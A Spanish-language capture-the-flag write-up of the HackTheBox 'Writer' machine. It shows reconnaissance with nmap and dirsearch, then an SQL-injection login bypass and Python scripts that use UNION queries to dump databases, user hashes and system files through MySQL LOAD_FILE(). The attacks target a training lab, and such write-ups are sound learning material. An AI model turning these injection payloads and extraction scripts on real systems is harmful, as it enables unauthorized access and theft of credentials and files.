---
layout      : post
title       : "HackTheBox - Writer"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361banner.png
category    : [ htb ]
tags        : [ SQLi, LFI, load_file(), apt-get, postfix-disclaimer, code-analysis ]
---
M√°quina Linux nivel medio. Bypassing de un panel-login, extracci√≥n de datos y lectura de archivos del sistema con la funcion **LOAD_FILE()**, todo lo anterior con un `SQLi` üòÆ An√°lisis est√°tico y din√°mico de c√≥digo **Python**, `command-injection` juguet√≥n en im√°genes (?), crackeowowow, explotaci√≥n de avisos parroquiales de `Postfix` y juegos sucios con paquetes `APT` que son ejecutados por `apt-get update`.

![361writerHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361writerHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [TheCyberGeek](https://www.hackthebox.eu/profile/114053).

El escritor...

> Este writeup salio especialmente largo, pero bastante entretenido, igual hay algunos procesos que tienen links para saltar entre partes por si quieres ir directo al rasputelius.

Servidor web con un login-panel bypass bastante jugoso mediante una `SQLinjection union-based`, la usaremos tanto para extraer toooooda la info de las BDs a las que tengamos acceso como para **leer archivos del sistema** (usando la funci√≥n `load_file` de MySQL) :o

> [plaYsQLi.py](https://github.com/lanzt/lanzt.github.io/blob/main/assets/scripts/HTB/writer/plaYsQLi.py)

Leeremos la fuente de la app web, tendremos los ojos y la mente bien abierta para encontrar un `command-injection` en una funcionalidad para editar historias en el servidor web. Moveremos cositas para finalmente obtener una Reverse Shell en el sistema como el usuario `www-data` (script que automatiza toooodo este proceso):

> [imajection.py](https://github.com/lanzt/lanzt.github.io/blob/main/assets/scripts/HTB/writer/imajection.py)

Estando dentro jugaremos con contrase√±as de **MySQL** volando y encontraremos otras dentro de una nueva base de datos, crackearemos un hash tipo `Django` y haciendo reutilizaci√≥n de contrase√±as generaremos una Shell como el usuario `kyle`.

Encontraremos una funcionalidad que agrega un **aviso legal** a los correos que sean enviados tanto a `kyle@writer.htb` como a `root@writer.htb`, el tema es que toooodo el `disclaimer` es procesado por un binario al que tenemos acceso de escritura yyyy es llevado a cabo por el usuario `john`, jugaremos con mails y modificaci√≥n de binarios para obtener una reverse Shell como el usurario `john`.

Finalmente, encontraremos que `john` puede escribir archivos de configuraci√≥n para **APT** (gestor de paquetes en GNU/Linux), usaremos ese poder para generar un paquete malicioso y esperar a que un usuario administrador del sistema ejecute `apt-get update` para que nuestro paquete EXPLOTE y por ende, explote su contenido. As√≠ conseguiremos una Reverse Shell como `root`.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Le cuesta, pero no le cuesta tanto llegar a ser real :P

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¬øpor que no hacerlo? ... Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

El √∫nico.

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorremos el servidor web alojado en el puerto 80](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [Encontramos **inyecci√≥n SQL** y bypasseamos login-panel](#web-sqli-login-bypass).
  * [Buscamos locuras ahora como **admin** en la web](#web-admin).
  * [Aprovechamos el bypass **SQLi** para extraer la info del servidor **SQL**](#web-sqli).
  * [- Extraemos variables usadas por el servidor SQL](#web-sqli-var).
  * [- Extraemos las bases de datos](#web-sqli-dbs).
  * [- Extraemos las tablas de X base de datos](#web-sqli-tables).
  * [- Extraemos las columnas de X tabla de X base de datos](#web-sqli-columns).
  * [- Extraemos data de X columnas relacionadas con X tabla de X base de datos](#web-sqli-data).
  * [Leemos archivos del sistema con la funci√≥n **LOAD_FILE** de **MySQL**](#web-sqli-loadfile).
  * [Encontramos posible **command-injection** en funcionalidad de la web](#web-command-injection).
  * [Aprovechamos **command-injection** para entablar una reverse shell](#web-command-injection-revsh).
4. [Movimiento lateral: www-data -> kyle](#django).
5. [Movimiento lateral: kyle -> john](#disclaimer).
6. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Como siempre lo primero ser√° encontrar que puertos (servicios) tiene abiertos **externamente** la m√°quina, esto lo podemos hacer con ayuda de la herramienta `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.11.101 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Tue Oct  5 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.11.101
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.101 ()   Status: Up
Host: 10.10.11.101 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///
# Nmap done at Tue Oct  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 116.09 seconds
```

Y obtenemos estos puertos abiertos externamente:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22      | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos da la opci√≥n de obtener una Shell (terminal) de manera segura. |
| 80      | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web. |
| 139,445 | **[SMB](https://www.varonis.com/blog/smb-port/)**: Nos permite interactuar con carpetas compartidas a trav√©s de la red de la m√°quina. |

Ya que tenemos los puertos abiertos de la m√°quina podemos explorar un poquito m√°s, quiz√°s encontremos **algo m√°s**, as√≠ que hagamos un escaneo de versiones (para eso, intentar obtener la versi√≥n del software) y scripts (son peque√±as instrucciones que tiene el propio `nmap` para probar contra X servicio) para cada puerto:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.101
    [*] Open ports: 22,80,139,445

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,139,445 -sC -sV 10.10.11.101 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Tue Oct  5 25:25:25 2021 as: nmap -p 22,80,139,445 -sC -sV -oN portScan 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-05T14:11:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.95 seconds
```

Podemos destacar algunas cositas:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 |
| 80     | HTTP     | Apache httpd 2.4.41 |

* Vemos un dominio que el propio **nmap** encuentra: `Writer.HTB`, para tener en cuenta por si algo.

---

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 139,445 | SMB     | Samba smbd 4.6.2 |

No tenemos nada m√°s, as√≠ que a explorar.

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Recorridos turbulentos por el <u>puerto 80</u> [üìå](#puerto-80) {#puerto-80}

Lo que vemos al hacer una petici√≥n contra la direcci√≥n IP `10.10.11.101` en nuestro navegador es:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un blog con varias historias, podemos interactuar con ellas, pero lo √∫nico medio relevante es que en cada una nos muestra el autor de la historia, podr√≠amos pensar en ellos como **usuarios** de algo, tengamos esto en mente por si algo...

Al no ver nada interesante, podr√≠amos probar a buscar directorios o archivos que no se est√©n listando (o viendo) en la web, pero que si est√©n siendo servidos por ella, o mejor llamado, **fuzzing**, usar√© `dirsearch` para eso:

```bash
‚ù± dirsearch.py -u http://10.10.11.101/
...
[25:25:25] Starting: 
[25:25:25] 200 -    3KB - /about
[25:25:25] 200 -    1KB - /administrative
[25:25:25] 200 -    5KB - /contact
[25:25:25] 302 -  208B  - /dashboard  ->  http://10.10.11.101/
[25:25:25] 302 -  208B  - /logout  ->  http://10.10.11.101/
[25:25:25] 403 -  277B  - /server-status/
[25:25:25] 403 -  277B  - /server-status
[25:25:25] 301 -  313B  - /static  ->  http://10.10.11.101/static/

Task Completed
```

De los recursos que `dirsearch` descubri√≥ ¬øcu√°l se ve llamativo? ü§®

Exacto, `/administrative` tiene un nombre bastante curioso, investigu√©moslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un login-panel bastante sencillo con el logo de [bootstrap](https://getbootstrap.com/) (que me llevo a varios **rabbit holes** :P), probando credenciales por default como:

* admin:admin
* admin:123456
* admin@writer.htb:admin
* (y muchas m√°s)

No logramos pasar el login y siempre obtenemos esto como respuesta:

‚ò†Ô∏è <span style="color: pink;">***Error: Incorrect credentials supplied***</span>

Despu√©s de algunas pruebas basadas en inyecciones (ya que estamos ante un login-panel, o sea que v√°lida credenciales de alguna base de datos (SQL Injection) o plantilla (XPath Injection))

Probando una inyecci√≥n simple simulando que exista el usuario `admin` como -usuario- del login, pensando/imaginando que la consulta que hace es:

```sql
... SELECT * FROM <tabla> WHERE username = 'admin';
```

Podr√≠amos explotarla simplemente jugando con las comillas y una operaci√≥n que si o si es verdadera, algo como `'1'='1'`:

```html
admin' or '1'='1
```

Y en la consulta SQL ser√≠a algo as√≠:

```sql
... SELECT * FROM <tabla> WHERE username = 'admin' or '1'='1';
```

Entonces, s√≠ es vulnerable validar√≠a primero que el usuario `admin` exista, en dado caso de no existir y si por cosas de la vida esta tan mal configurado el backend, pues tomar√≠a el `'1'='1'`, como esa es una expresi√≥n que va a ser **verdadera** sieeeeempre, lograr√≠amos bypassear el login-panel. Pos probemos...

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

...

## Bypasseamos login mediante una <u>inyecci√≥n SQL</u> [üìå](#web-sqli-login-bypass) {#web-sqli-login-bypass}

Los par√°metros del login viajan de esta manera:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative_paramsPOSTdata.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

As√≠ que podemos enviar este payload:

```html
uname=admin' or '1'='1
password=admin' or '1'='1
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative_req_SQLItoBypassLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Damos clic en `Sign In` yyyyyyyyyyyyyyyy vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative_res_redirect_SQLItoBypassLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAa, nos saluda como el usuario `admin` yyyy nos redirecciona al apartado `/dashboard`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative_res_dashboard_SQLItoBypassLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfect√≠simo, hemos bypasseado el panel-login descubriendo que el usuario `admin` esta en la base de datos a√∫n sin saber su contrase√±a :P Veamos si podemos hacer algo dentro del **dashboard**, si no, volvemos al `SQLi` e intentamos descubrir bases de datos, tablas y dem√°s cositas locas...

---

## Buscamos locuras ahora como <u>admin</u> en la web [üìå](#web-admin) {#web-admin}

Tenmos estos apartados para interactuar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_dashboard_menu.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Despu√©s de recorrer todas, la m√°s interesante e interactiva es **Stories**, que nos lleva a `/dashboard/stories`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Podemos agregar, modificar y borrar historias al blog que vimos al inicio (: Por ejemplo si intentamos editar el primer post (ID 1 = On the Origin of Shadows) tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories_edit1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

¬øQu√© ven llamativo? üëÄ

Hay un apartado para subir/editar la imagen relacionada con el post, peeeeeeeero en ese mismo apartado tenemos un comentario:

üìë ***The image must have a maximum size of 1MB in .jpg format. <u>Click here to upload from URL</u>.***

Si damos clic en `here` cambia el campo y nos muestra esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories_edit1_imagefromURL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues inicialmente podemos probar si realmente hace la petici√≥n web en b√∫squeda de la imagen, levantamos un servidor web en el puerto `8000` con ayuda de `Python`:

```bash
‚ù± python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y en el campo de la URL ponemos nuestra direcci√≥n y un archivo X, la idea es ver si llega la petici√≥n. Pero al dar clic en `Save` nos devuelve:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_stories_edit1_imagefromURL_tryWITHserverPY.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

No nos permite por un tema del formato, jugando con eso no llegamos a ning√∫n lado, as√≠ que por ahora dejemos esto quieto y enumeremos el servidor **SQL**.

...

## Usamos <u>SQLi</u> para extraer info del servidor SQL [üìå](#web-sqli) {#web-sqli}

Lo primero ser√° ver contra que servicio **SQL** estamos y lo segundo contra que tipo de **SQLi** nos encontramos, ya que puede ser **error-based**, **union-based** o **blind-based** principalmente:

Jugando con el **error-based** no logramos ver "errores" al ejecutar sentencias, as√≠ que lo descartamos.

Para validar si puede ser **union-based** lo mejor es intentar descubrir cuantas columnas tiene la tabla actual donde se est√°n haciendo las consultas, para hacer esto jugamos con la instrucci√≥n [ORDER BY](https://www.w3schools.com/sql/sql_orderby.asp). Con ella lograremos ordenar las columnas ya sea de manera descendente o ascendente. 

El punto es que si intentamos ordenar las columnas con un numero mayor al de las propias columnas que existan en la tabla (por ejemplo, una tabla tiene 5 columnas, si intentamos ordenarla como si tuviera 6, dar√≠a error), la idea es buscar un numero que no nos d√© error (en este caso lo sabr√≠amos cuando nos deje logearnos (si es que nos deja)), si lo encontramos, primero confirmamos el n√∫mero de columnas de la tabla y segundo el tipo de **SQL injection**: `union-based`...

Su uso es sencillo:

```sql
ORDER BY <numero_de_columnas>
```

Adecu√°ndolo a nuestro payload ser√≠a algo as√≠:

```sql
uname=admin' ORDER BY <numero_de_columnas>;#
password=admin' ORDER BY <numero_de_columnas>;#
```

R√°pidamente, armamos un script (o con `cURL` o como quieran, yo usare `Python`) para validar con 100 columnas:

```py
#!/usr/bin/python3

import requests

URL = "http://10.10.11.101/administrative"

for column_num in range (1,101):
    payload = f"admin' ORDER BY {column_num};#"

    r = requests.post(URL, data={"uname":payload,"password":payload})

    # Vimos que antes del dashboard habia un redirect y nos mostraba un mensaje, tomemos parte de ese mensaje para validar la respuesta esperada.
    # Si la respuesta lo contiene, sabemos que ese numero de columnas nos permitio el bypass, cuando deje de aparecer el mensaje, sabemos que ese num no es valido.
    if "Redirecting you to the dashboard" not in r.text:
        print(f"Este es el numero de columnas: {column_num - 1}, desde la {column_num} no permite el bypass.")
        break
```

Si lo ejecutamos nos muestra esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_testorderPY.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTOOOOOOOOOO, tenemos el n√∫mero de columnas (`6`) y confirmamos que estamos ante una inyecci√≥n SQL tipo `union-based`, empecemos a usarla...

...

### Extraemos variables usadas por el servidor SQL [üíâ](#web-sqli-var) {#web-sqli-var}

Usar√© este apartado para mostrarles como se ver√≠a reflejado el resultado de nuestra consulta, pero las dem√°s extracciones simplemente mostrar√© el resultado, esto para no hacer taaaan largo el writeup (:

Sabemos que hay 6 columnas, nuestro nuevo payload va a quedar as√≠ para toooodas las extracciones, nos queda saber contra qu√© servidor SQL estamos y que columnas son v√°lidas para escribir texto.

```sql
admin' UNION ALL SELECT 1,2,3,4,5,6;#
```

Ah√≠ le estar√≠amos diciendo que nos muestre tooooooooooodas las columnas donde sea que est√©n de la respuesta, entonces, ejecutamos:

```py
#!/usr/bin/python3

import requests

URL = "http://10.10.11.101/administrative"

payload = f"admin' UNION ALL SELECT 1,2,3,4,5,6;#"
r = requests.post(URL, data={"uname":payload,"password":payload})

if "Redirecting you to the dashboard" in r.text:
    print(r.text)
```

Si tomamos la respuesta y nos ponemos frescos con la vista, vamos a ver algo llamativo por ah√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_testunionPY.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay un `2` al lado de **admin** y claramente antes no estaba:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361page80_administrative_res_redirect_SQLItoBypassLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Por lo que nos hace pensar que el `2` de nuestro payload puede ser ese `2`, como prueba definitiva agreguemos un texto ah√≠ random:

```py
payload = f"admin' UNION ALL SELECT 1,'holiwis',3,4,5,6;#"
```

Ejecutamos yyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_testunionPY_holiwis.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECT√çSIMO, CONFIRMAMOOOOOOOOOS y ya tenemos un campo para jugar de ahora en adelante (:

Veamos que versi√≥n de SQL tenemos:

```sql
payload = f"admin' UNION ALL SELECT 1,version(),3,4,5,6;#"
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_testunionPY_version.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> `10.3.29-MariaDB-0ubuntu0.20.04.1` listones, esto solamente nos confirma que el gestor de DB esta enfocado en `MySQL`. 

Ahora lo lindo, empecemos a crear un script bieeeeeeeeen lococh√≥n que nos extraiga de T O D O...

* [Ac√° hay muuuuchas cositas para extraer con ayuda de los SQLI](https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql).

...

‚ö†Ô∏è‚ù§Ô∏è‚ö†Ô∏è **<span style="color:red;">ANUNCIO</span>: <span style="color:yellow;">Vamos a extraer DBS, TABLAS, COLUMNAS y DATA m√°s por ense√±anza que por otra cosa, ya que la m√°quina no requiere eso para seguir, as√≠ que si deseas pasar esa fase da</span> [<u>clic ac√°</u>](#web-sqli-loadfile) <span style="color:yellow;">y caes directo a lo necesario para continuar con la m√°quina, saludes y besitos</span>** ‚ö†Ô∏è‚ù§Ô∏è‚ö†Ô∏è 

...

### Extraemos las bases de datos [üíâ](#web-sqli-dbs) {#web-sqli-dbs}

Lo dicho no voy a profundizar mucho, cositas b√°sicas...

Ac√° hablamos directamente con la base de datos `information_schema` y su tabla `schemata`, de ella extraemos la columna `schema_name` que es la que contiene las **bases de datos** actuales y a las que tenemos acceso, √∫nicamente que vamos limitando la respuesta a una (1) fila, as√≠ obtenemos tooodas las filas, o sea, todas las dbs (:

```py
...
# Por ejemplo si queremos listar 100 bases de datos (e.e)
for row in range(101):
    payload = f"admin' UNION ALL SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT {row},1),3,4,5,6;#"
...
```

> [plaYsQLi.py - show_databases()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/plaYsQLi.py#L79)

Ejecutamos y:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos dos bases de datos, nos llama la atenci√≥n la que se llama como la m√°quina claramente, descubramos sus tablas.

### Extraemos las tablas de la db <u>writer</u> [üíâ](#web-sqli-tables) {#web-sqli-tables}

Ac√° ahora jugamos con la tabla `tables`, peeeeeero filtramos √∫nicamente las tablas de la base de datos (la que tengamos en `table_schema`) que le indiquemos, en este caso `writer`, as√≠ extraer√≠a los `table_name` correspondientes a esa db:

```py
...
for row in range(101):¬∑
    payload = f"admin' UNION ALL SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {row},1),3,4,5,6;#"
...
```

> [plaYsQLi.py - show_tables()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/plaYsQLi.py#L94)

Ejecutamos y:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_tables.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, tenemos la tabla donde se guardan las historias que vimos en la web, tambi√©n partes del sitio y una con referencia a usuarios, inspeccionemos las columnas de esa tabla `users`.

### Extraemos las columnas de la tabla <u>users</u> de la db <u>writer</u> [üíâ](#web-sqli-columns) {#web-sqli-columns}

Ahora nos enfocamos en la tabla `columns`, pero de nuevo, √∫nicamente queremos extraer las columnas de la base de datos (`table_schema`) `writer` y la tabla (`table_name`) `users`:

```py
...
for row in range(101):¬∑
    payload = f"admin' UNION ALL SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {row},1),3,4,5,6;#"
...
```

> [plaYsQLi.py - show_columns()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/plaYsQLi.py#L109)

Ejecutamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_columns.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo esperado, tenemos `username` y `password` como campos claramente llamativos, pues intentemos extraerlos.

### Extraemos la data en columnas de la tabla <u>users</u> - db <u>writer</u> [üíâ](#web-sqli-data) {#web-sqli-data}

Ac√° la consulta es m√°s sencilla, √∫nicamente le decimos que queremos extraer una o varias columnas (`username`) de una tabla (`users`) asociada a una base de datos (`writer`):

```py
...
for row in range(101):¬∑
    payload = f"admin' UNION ALL SELECT 1,(SELECT {column} FROM {db}.{table} LIMIT {row},1),3,4,5,6;#"
...
```

> [plaYsQLi.py - show_data()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/plaYsQLi.py#L124)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_data_userYpass.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si quisi√©ramos evitar listar de a un resultado podemos jugar con la instrucci√≥n [CONCAT](https://www.w3schools.com/mysql/func_mysql_concat.asp) de **MySQL**, por ejemplo para ver `username` y `password` al tiempo, podr√≠amos hacer algo as√≠:

```py
...
for row in range(101):¬∑
    payload = f"admin' UNION ALL SELECT 1,(SELECT CONCAT(username,'-',password) FROM {db}.{table} LIMIT {row},1),3,4,5,6;#"
...
```

Y en su ejecuci√≥n ver√≠amos algo tal que as√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_data_concat.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues peeeeerfecto, ya hemos dumpeado cosas interesantes, lamentablemente no logramos crackear esa contrase√±a (el hash) y tampoco ver algo llamativo en las dem√°s tablas, as√≠ que tamos F (:
Al menos aprendimos a extraer tooooooooooda la locura de una base de datos y sali√≥ un script bastante guapet√≥n :)

...

## Funci√≥n LOAD_FILE: Leemos archivos del sistema [üìå](#web-sqli-loadfile) {#web-sqli-loadfile}

Despu√©s de bastante perdici√≥n, enumerando cositas y perdiendo otras. Ca√≠ en este apartado de un recurso que hab√≠a compartido antes:

* [Reading and Writing Files](https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql).

Nos indica que mediante `MySQL` podemos leer archivos **del sistema** usando la funci√≥n [LOAD_FILE(\<archivo\>)](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php) (que no la hab√≠a usado y tampoco escuchado, as√≠ que a explorarla):

* [Ac√° tambi√©n referencian como usarla para obtener informaci√≥n](https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2).

Por ejemplo si queremos ver el archivo `/etc/passwd` del sistema, har√≠amos esto:

```py
#!/usr/bin/python3

import requests

URL = "http://10.10.11.101/administrative"

payload = f"admin' UNION ALL SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6;#"
r = requests.post(URL, data={"uname":payload,"password":payload})

if "Redirecting you to the dashboard" in r.text:
    print(r.text)
```

Y como respuesta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_loadfilePY_etcPasswd.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Obtenemos el contenido del archivo. De primeras destacamos algunos usuarios con acceso a una terminal:

```bash
- root
- kyle
- filter
- john
```

As√≠ que perfeccccct√≠simo, podemos leer archivos del sistema con ayuda de la funci√≥n `load_file()` de **MySQL**. 

Jugando de nuevo con nuestro script conseguiremos tomar el output y extraer √∫nicamente el contenido del archivo que queramos leer:

> [plaYsQLi.py - show_file()](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/writer/plaYsQLi.py#L68)

Ahora es muuucho m√°s sencillo, por ejemplo veamos el archivo `/etc/hosts` de la m√°quina v√≠ctima:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_loadFile_etcHosts.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Funcional, as√≠ que a enumerar...

Si recordamos, en el inicio de nuestro reconocimiento vimos que el servidor web estaba siendo mantenido por `Apache`, esto nos da la oportunidad de buscar los archivos de configuraci√≥n de ese servicio, ya que quiz√°s encontremos la ra√≠z de objetos por ejemplo del servidor web.

* [C√≥mo instalar el servidor web Apache en Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/como-instalar-el-servidor-web-apache-en-ubuntu-18-04-es).

Entre tooooodas las referencias de objetos que podemos obtener de ese art√≠culo (y de muchos otros) destacamos inicialmente esta cita:

üóÑÔ∏è ***... la configuraci√≥n predeterminada se encuentra en `/etc/apache2/sites-available/000-default.conf`***. [C√≥mo instalar el servidor web Apache en Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/como-instalar-el-servidor-web-apache-en-ubuntu-18-04-es)

Pues intentemos obtener su contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_loadFile_000default1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_sqliPY_loadFile_000default2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Excelente, existe yyyy contiene bastante info, destaquemos cositas...

```bash
(Blog - Port 80)
Root folder:  /var/www/writer.htb
WSGIScripts:  /var/www/writer.htb/writer.wsgi
Static files: /var/www/writer.htb/writer/static/

(Writer2 - Future development)
Root folder:    /var/www/writer2_project
Static files:   /var/www/writer2_project/static/
Template files: /var/www/writer2_project/writer_web/templates
Unknow folder:  /var/www/writer2_project/writerv2
python-home:    /var/www/writer2_project/writer2env
WSGIScripts:    /var/www/writer2_project/writerv2/wsgi.py
```

